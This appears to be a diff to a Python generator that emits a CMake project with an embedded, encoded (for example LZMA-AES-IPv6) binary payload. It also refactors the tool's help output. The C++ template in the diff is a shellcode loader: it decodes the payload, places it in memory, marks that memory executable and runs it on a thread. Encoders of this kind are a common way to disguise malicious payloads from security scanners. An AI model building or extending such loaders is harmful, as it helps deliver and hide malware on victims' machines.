@@ -14,6 +14,14 @@ from .encoder import available_encoders, get_encoder
 
 PAYLOAD_NAMESPACE = "embedded_payload"
 
+
+class HelpFormatter(
+    argparse.ArgumentDefaultsHelpFormatter,
+    argparse.RawDescriptionHelpFormatter,
+):
+    """Preserve grouped help text while still showing defaults."""
+
+
 CMAKE_TEMPLATE = r'''cmake_minimum_required(VERSION 3.16)
 project(embedded_payload_decoder LANGUAGES CXX)
 
@@ -65,6 +73,7 @@ MAIN_CPP = r'''#include "payload_decoder.h"
 #endif
 #include <cstring>
 #include <stdexcept>
+#include <thread>
 
 int main() {
     try {
@@ -73,9 +82,9 @@ int main() {
         embedded::PayloadBuffer payload = embedded::decode_payload(data, size);
 #ifdef _WIN32
         void* exec_mem = VirtualAlloc(
-            nullptr, 
-            size, 
-            MEM_COMMIT | MEM_RESERVE, 
+            nullptr,
+            size,
+            MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
         if (!exec_mem) return 0;
@@ -87,17 +96,13 @@ int main() {
             VirtualFree(exec_mem, 0, MEM_RELEASE);
             return 0;
         }
-        reinterpret_cast<void (*)()>(exec_mem)();
-
-        if (!exec_mem) return 0;
-        VirtualFree(exec_mem, 0, MEM_RELEASE);
 #else
         void* exec_mem = mmap(
-            nullptr, 
-            size, 
-            PROT_READ | PROT_WRITE, 
-            MAP_PRIVATE | MAP_ANONYMOUS, 
-            -1, 
+            nullptr,
+            size,
+            PROT_READ | PROT_WRITE,
+            MAP_PRIVATE | MAP_ANONYMOUS,
+            -1,
             0
         );
         if (exec_mem == MAP_FAILED) return 0;
@@ -105,13 +110,18 @@ int main() {
         std::memcpy(exec_mem, data, size);
 
         if (mprotect(exec_mem, size, PROT_READ | PROT_EXEC) != 0) {
-            munmap(exec_mem, size); 
+            munmap(exec_mem, size);
             return 0;
         }
+#endif
 
-        reinterpret_cast<void (*)()>(exec_mem)();
+        auto payload_entry = reinterpret_cast<void (*)()>(exec_mem);
+        std::thread payload_thread([payload_entry]() { payload_entry(); });
+        payload_thread.join();
 
-        if (!exec_mem) return 0;
+#ifdef _WIN32
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+#else
         munmap(exec_mem, size);
 #endif
         return 0;
@@ -121,15 +131,16 @@ int main() {
 }
 '''
 
-def _parser(encoder_name: str) -> argparse.ArgumentParser:
-    encoder = get_encoder(encoder_name)
-    parser = argparse.ArgumentParser(
-        description="Generate a cross-platform CMake project with an embedded payload.",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
-        epilog=encoder.CLI_EPILOG,
-    )
+
+
+def _add_common_arguments(parser: argparse.ArgumentParser) -> None:
     parser.add_argument("input", type=Path, metavar="INPUT", help="binary file to embed")
-    parser.add_argument("output", type=Path, metavar="OUTPUT_DIR", help="destination directory; it must not already exist")
+    parser.add_argument(
+        "output",
+        type=Path,
+        metavar="OUTPUT_DIR",
+        help="destination directory; it must not already exist",
+    )
     parser.add_argument(
         "--encoder",
         choices=available_encoders(),
@@ -137,16 +148,109 @@ def _parser(encoder_name: str) -> argparse.ArgumentParser:
         metavar="ENCODER",
         help="payload encoder; available choices: %(choices)s",
     )
+
+
+def _selection_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument(
+        "--encoder", choices=available_encoders(), default="lzma-aes-ipv6"
+    )
+    return parser
+
+
+def _parser(encoder_name: str) -> argparse.ArgumentParser:
+    encoder = get_encoder(encoder_name)
+    parser = argparse.ArgumentParser(
+        description="Generate a cross-platform CMake project with an embedded payload.",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        epilog=encoder.CLI_EPILOG,
+    )
+    _add_common_arguments(parser)
     encoder.add_cli_arguments(parser)
     return parser
 
 
-def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
-    selector = argparse.ArgumentParser(add_help=False)
-    selector.add_argument(
-        "--encoder", choices=available_encoders(), default="lzma-aes-ipv6"
+def _metavar(action: argparse.Action) -> str:
+    if action.metavar is not None:
+        if isinstance(action.metavar, tuple):
+            return " ".join(action.metavar)
+        return str(action.metavar)
+    return action.dest.upper()
+
+
+def _option_invocation(action: argparse.Action) -> str:
+    option = ", ".join(action.option_strings)
+    if action.nargs == 0:
+        return option
+    return f"{option} {_metavar(action)}"
+
+
+def _encoder_help_block(encoder_name: str, selected_encoder: str) -> str:
+    encoder = get_encoder(encoder_name)
+    probe = argparse.ArgumentParser(add_help=False)
+    encoder.add_cli_arguments(probe)
+
+    lines = [
+        f"[{encoder_name}{' - selected' if encoder_name == selected_encoder else ''}]",
+        f"  Example: {encoder.CLI_EPILOG.removeprefix('Example: ')}",
+    ]
+
+    actions: list[argparse.Action] = []
+    for group in probe._action_groups:
+        if group.title in {"positional arguments", "options", "optional arguments"}:
+            continue
+        actions.extend(group._group_actions)
+
+    if not actions:
+        lines.append("  (no encoder-specific options)")
+        return "\n".join(lines)
+
+    width = max(len(_option_invocation(action)) for action in actions)
+    for action in actions:
+        invocation = _option_invocation(action)
+        help_text = action.help or ""
+        default = None if action.default is argparse.SUPPRESS else action.default
+        if default not in (None, False):
+            help_text = f"{help_text} (default: {default})"
+        lines.append(f"  {invocation:<{width}}  {help_text}")
+    return "\n".join(lines)
+
+
+def _help_epilog(selected_encoder: str) -> str:
+    sections = [
+        "Encoder-specific options are defined inside each encoder module and are grouped below:",
+        "",
+    ]
+    names = [selected_encoder] + [
+        name for name in available_encoders() if name != selected_encoder
+    ]
+    for index, encoder_name in enumerate(names):
+        if index:
+            sections.append("")
+        sections.append(_encoder_help_block(encoder_name, selected_encoder))
+    return "\n".join(sections)
+
+
+def _help_parser(selected_encoder: str) -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description=(
+            "Generate a cross-platform CMake project with an embedded payload.\n\n"
+            "Use --encoder to choose a payload format; module-specific parameters are "
+            "listed after the common arguments."
+        ),
+        formatter_class=HelpFormatter,
+        epilog=_help_epilog(selected_encoder),
     )
-    selected, _ = selector.parse_known_args(argv)
+    _add_common_arguments(parser)
+    return parser
+
+
+def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
+    argv = list(sys.argv[1:] if argv is None else argv)
+    selected, _ = _selection_parser().parse_known_args(argv)
+    if any(argument in {"-h", "--help"} for argument in argv):
+        print(_help_parser(selected.encoder).format_help(), end="")
+        raise SystemExit(0)
     return _parser(selected.encoder).parse_args(argv)
 
 
